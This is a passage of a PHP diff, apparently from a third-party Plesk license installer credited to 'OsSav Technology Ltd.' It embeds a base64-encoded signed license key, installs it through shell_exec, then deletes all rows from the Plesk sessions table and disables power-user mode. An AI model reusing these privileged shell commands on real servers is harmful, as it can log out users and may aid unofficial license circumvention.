tdHlwZSBjb3JlOnR5cGU9InN0cmluZyI+dHJpYWw8L3BsZXNrLXVuaWZpZWQ6bGljZW5zZS10eXBlPgogICA8IS0tSW5mb3JtYXRpb24gYWJvdXQgZmVhdHVyZSBwYWNrcy0tPgogICA8cGxlc2stdW5pZmllZDpmZWF0dXJlLXBhY2tzLWluZm8gY29yZTplbmNvZGluZz0iYmFzZTY0IiBjb3JlOnR5cGU9ImJpbmFyeSI+VzNzaVkyOWtaU0k2SW05bVptVnlMV05uY205MWNITWlMQ0pyWlhsT2RXMWlaWElpT201MWJHd3NJbVJsYzJOeWFYQjBhVzl1SWpvaVVHeGxjMnNnUTJkeWIzVndjeUJOWVc1aFoyVnlJaXdpYjNKcFoybHVJam9pWW5WdVpHeGxaQ0lzSW1KMWJtUnNaU0k2SWxCc1pYTnJJRmRsWWlCSWIzTjBJRVZrYVhScGIyNGdLREUwSUVSaGVYTWdWSEpwWVd3cElpd2liM0prWlhKQlkzUnBiMjRpT201MWJHd3NJbk52ZFhKalpTSTZJblJ5YVdGc0luMHNleUpqYjJSbElqb2liMlptWlhJdGJHRnVaM1ZoWjJVdGNHRmpheUlzSW10bGVVNTFiV0psY2lJNmJuVnNiQ3dpWkdWelkzSnBjSFJwYjI0aU9pSk1ZVzVuZFdGblpTQlFZV05ySWl3aWIzSnBaMmx1SWpvaVluVnVaR3hsWkNJc0ltSjFibVJzWlNJNklsQnNaWE5ySUZkbFlpQkliM04wSUVWa2FYUnBiMjRnS0RFMElFUmhlWE1nVkhKcFlXd3BJaXdpYjNKa1pYSkJZM1JwYjI0aU9tNTFiR3dzSW5OdmRYSmpaU0k2SW5SeWFXRnNJbjBzZXlKamIyUmxJam9pYjJabVpYSXRkMlZpTFhCeVpYTmxibU5sTFdKMWFXeGtaWElpTENKclpYbE9kVzFpWlhJaU9tNTFiR3dzSW1SbGMyTnlhWEIwYVc5dUlqb2lWMlZpSUZCeVpYTmxibU5sSUVKMWFXeGtaWElpTENKdmNtbG5hVzRpT2lKaWRXNWtiR1ZrSWl3aVluVnVaR3hsSWpvaVVHeGxjMnNnVjJWaUlFaHZjM1FnUldScGRHbHZiaUFvTVRRZ1JHRjVjeUJVY21saGJDa2lMQ0p2Y21SbGNrRmpkR2x2YmlJNkltSjFlU0lzSW5OdmRYSmpaU0k2SW5SeWFXRnNJbjBzZXlKamIyUmxJam9pZDNBdGRHOXZiR3RwZENJc0ltdGxlVTUxYldKbGNpSTZiblZzYkN3aVpHVnpZM0pwY0hScGIyNGlPaUpYYjNKa1VISmxjM01nVkc5dmJHdHBkQ0lzSW05eWFXZHBiaUk2SW1KMWJtUnNaV1FpTENKaWRXNWtiR1VpT2lKUWJHVnpheUJYWldJZ1NHOXpkQ0JGWkdsMGFXOXVJQ2d4TkNCRVlYbHpJRlJ5YVdGc0tTSXNJbTl5WkdWeVFXTjBhVzl1SWpwdWRXeHNMQ0p6YjNWeVkyVWlPaUowY21saGJDSjlYUT09PC9wbGVzay11bmlmaWVkOmZlYXR1cmUtcGFja3MtaW5mbz4KICAgPCEtLVByZWZlcnJlZCBWaWV3LS0+CiAgIDxwbGVzay11bmlmaWVkOnByZWZlcnJlZC12aWV3IGNvcmU6dHlwZT0ic3RyaW5nIj5wb3dlciB1c2VyPC9wbGVzay11bmlmaWVkOnByZWZlcnJlZC12aWV3PgogICA8ZHM6U2lnbmF0dXJlIHhtbG5zOmRzPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjIj4KPGRzOlNpZ25lZEluZm8+CjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3BhcmFsbGVscy5jb20vc2NoZW1hcy9rZXlzL2NvcmUvMyNjYW5vbmljYWxpemUiLz4KPGRzOlNpZ25hdHVyZU1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZHNpZy1tb3JlI3JzYS1zaGEyNTYiLz4KPGRzOlJlZmVyZW5jZSBVUkk9IiI+CjxkczpUcmFuc2Zvcm1zPgo8ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvVFIvMjAwMS9SRUMteG1sLWMxNG4tMjAwMTAzMTUjV2l0aENvbW1lbnRzIi8+CjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vcGFyYWxsZWxzLmNvbS9zY2hlbWFzL2tleXMvY29yZS8zI3RyYW5zZm9ybSIvPgo8L2RzOlRyYW5zZm9ybXM+CjxkczpEaWdlc3RNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGVuYyNzaGEyNTYiLz4KPGRzOkRpZ2VzdFZhbHVlPlpjOFVPTDRDUStGeFFXNzB3bGwxYi9hZGRrT1ZGRG5rQmhCVEY3aEpnSkk9PC9kczpEaWdlc3RWYWx1ZT4KPC9kczpSZWZlcmVuY2U+CjwvZHM6U2lnbmVkSW5mbz4KPGRzOlNpZ25hdHVyZVZhbHVlPgpIbVZ6cHNVQldaNm93czBBa2I2S2ZTS2lhdmF2ZTZuZCtFOE9DTnp1bkpOR1FyeXVLTGpwdWxsRDlWL29wMEhzOU9zbjZ4TXBPMC9tCmlDdVl3NTZGbHE5c2c2djBzOFNJMlJ6a0g0aVB2SEk3MnVhUUQ1WEhTRUovWmVEbWdJd2ZuVTJxVWh0MDRqU1VRRk5LaHQ5U2kxMGEKU2lvejJLMFhIc3BJYTAySkNzOVpoSDJnNFRvMU1IRTVMRWlwWDkrTmx4RStRWEljbEwrYVdhdEkzMFpLd1B1UWIrZnc2enFRcVFXMwpLTkl2TVNTQm9SdFY3NVFBakhDK0dVWUM3eEwwSzhoZE50cHpkVEJjci9vUFBqbGpGMm5xbTMyNFR2SmxHdE9sbzBNK2ZqNy9CSUR4CnVRR0VtaTMyNldaUmpndWxQblRlcWFEelZaanZlU2ZLYzF4NXlBPT0KPC9kczpTaWduYXR1cmVWYWx1ZT4KPGRzOktleUluZm8+CjxkczpYNTA5RGF0YT4KPGRzOlg1MDlDZXJ0aWZpY2F0ZT4KTUlJRW5qQ0NBb1lDQVRBd0RRWUpLb1pJaHZjTkFRRUZCUUF3Z2FZeEN6QUpCZ05WQkFZVEFrSk5NUXN3Q1FZRFZRUUlFd0pJVFRFUgpNQThHQTFVRUJ4TUlTR0Z0YVd4MGIyNHhIREFhQmdOVkJBb1RFMU5YYzI5bWRDQkliMnhrYVc1bmN5Qk1kR1F4SFRBYkJnTlZCQXNUCkZFbHVkR1Z5Ym1Gc0lFUmxkbVZzYjNCdFpXNTBNUnd3R2dZRFZRUURFeE5MUVNCeWIyOTBJR05sY25ScFptbGpZWFJsTVJ3d0dnWUoKS29aSWh2Y05BUWtCRmcxcllVQnpkM052Wm5RdVkyOXRNQjRYRFRFek1URXhNVEE1TWpneE1sb1hEVFF4TURNeU9UQTVNamd4TWxvdwpnWUl4RmpBVUJnTlZCQU1URFhCc1pYTnJMWFZ1YVdacFpXUXhIVEFiQmdOVkJBc1RGRWx1ZEdWeWJtRnNJRVJsZG1Wc2IzQnRaVzUwCk1Sd3dHZ1lEVlFRS0V4TlRWM052Wm5RZ1NHOXNaR2x1WjNNZ1RIUmtNUkV3RHdZRFZRUUhFd2hJWVcxcGJIUnZiakVMTUFrR0ExVUUKQ0JNQ1NFMHhDekFKQmdOVkJBWVRBa0pOTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFqTnRxR2d0awpDNkVueUUzUWxhMkU0K2ppUVBEMkd3MEJoaEVieHM1Y2EyR3IydWU5WTZHVFZmMUNpNXJyaTM5UGc3L1V5REk4SHBHQjV3Q1ZnMzZhCk11Z3ZBVDEraFBTbkFiRGpTeGpmWjl6WjVXUE1jNXQvejlUbkZGZEhtK1pUaG5nSEY0NDlkbklkeGJtQnpab0ljS1E0VmdOdGJwSTQKOGhBQVpTcW9kNkloVVZWbnNpT2lWS29BdkZtT1NKV2ZFMVlvNkVOQ1FvQUdITWlJQ05aaUo4RkczbjBwK2FnS0dxYmxJTndDOTFONAoyTUdzeFZwTEZHbHUzd1FMSi9NWXd0LzJxQlhZcFZtbGh4M2NYWFdmZDZ0WWJyMUhZNDA0RlVMampKSGRDZzQ3WVJRZTlid0Q1OTVxCkUrWHBoa0pPUGFwT0xyNUYwT0lSRFBUMnVnYTJNUUlEQVFBQk1BMEdDU3FHU0liM0RRRUJCUVVBQTRJQ0FRQkxpR000VG5RL29ZVkIKbmlRTmNleFd4STNFWEZoSjQxY01lcWt4Mm5ZUTVHU0NaaGRJQUFKdVBiWkNKaHF6VCtMbG4wNHNnZWFjaEE2em4yVmxnOVg2QmZ4NwpHVm5vU1pxNUNEbUdxajAwVytrUTZhRjgzOUpvUDlXZFlXancxVlJONWlWSjhQOW9QVnRsV3hLeHU2VTNpRjNjb3k4SWdFYU1hMTU0CllVQnh2amI1aFNyZnFqeENVdGpyTTF3OG5KaHV4dnJhd0VjdmE5MTI5Zm5XUjJjTlVFVlpiaXczMk1IbjJTaDVIRWtYZ0F4UlZQdnEKKzJ0cllrUFpNV1I3UXoxSTVJOWk4dm1USnh0VXVNYTZMa21lY2FIeVFwS1hTbGM0ZlowSEVveGl1QllWOW5UYWRlUFh6a09GK0x6agpUN2lnd2thM1BLRG1HWS9neWhwcks0T2dOWW41Y1JkYTZOSjlkZVR1VUdLT1pacVdBNVlPL1RQZFZxZnRyRnRxcmMyS2VkL0NWZXBNCnAzanl5eXU2ZVRsWUdCWS9WYTZ4Yk1ERU5kTThTb24yY3lDcXdzSXhQVHVmbVR2R3Rsc2s2a1lxMHNwQWZFNEd3Q0JxSWlZTUU0MFIKUjA2bGd5d0tUZEJpN2NIems2aFQ2amUxVGNiQU81cFJkaHRyWXpIU0ZGaThtSnVsaFZ6Mk9tN2lBTHlnbmVJdDJlay8vbnkvS2U1dgp5MHFHUFhGZ0FpNTZJR2R6T2ZPNExOM3FWTnA1NGFZM2szRmFFczhtYmtJaS8zNVZRQWw2RGk1THRjQzNWUFVhcHZsY1RFdTJuWFk3ClN1OWttR20xNzFyaXBtMTdzNDY0dVdYTVByR3IxakhCWUhrZDdhSXRybWtQT0txZDFpTXdxYWZIU1B3ajJBPT0KPC9kczpYNTA5Q2VydGlmaWNhdGU+CjwvZHM6WDUwOURhdGE+CjwvZHM6S2V5SW5mbz4KPC9kczpTaWduYXR1cmU+CjwvcGxlc2stdW5pZmllZDprZXk+Cg=="));
+		LisanslamaUygula:
+		echo "Lisans Yukleniyor...
+";
+		$Ins=trim(shell_exec('"'.$File_Lic.'" -i "'.$Xml_Path.'"'.$Exec_End));
+		if(stristr($Ins,'successfully installed')){
+			echo "Lisans Yukleme: OK
+";
+			shell_exec('plesk db "DELETE FROM psa.sessions";');
+			shell_exec('plesk bin poweruser --off');
+		}elseif(0 > 5 and $LicDeneSay < 3){
+			$LicDeneSay++;
+			echo "Hata, Lisans Yuklenemedi!
+";
+			OzelLisansAlYukle:
+			echo "Size Ozel Lisans Aliniyor...!
+";
+						echo "Ozel Lisans Kodunuz: ".$Xml_Path."
+";
+			Goto LisanslamaUygula;
+		}else{
+			echo "Hata: '".$Ins."'
+";
+		}
+	}
+	echo "
+License Provider - OsSav Technology Ltd. - www.ossav.com
+
+";
+}
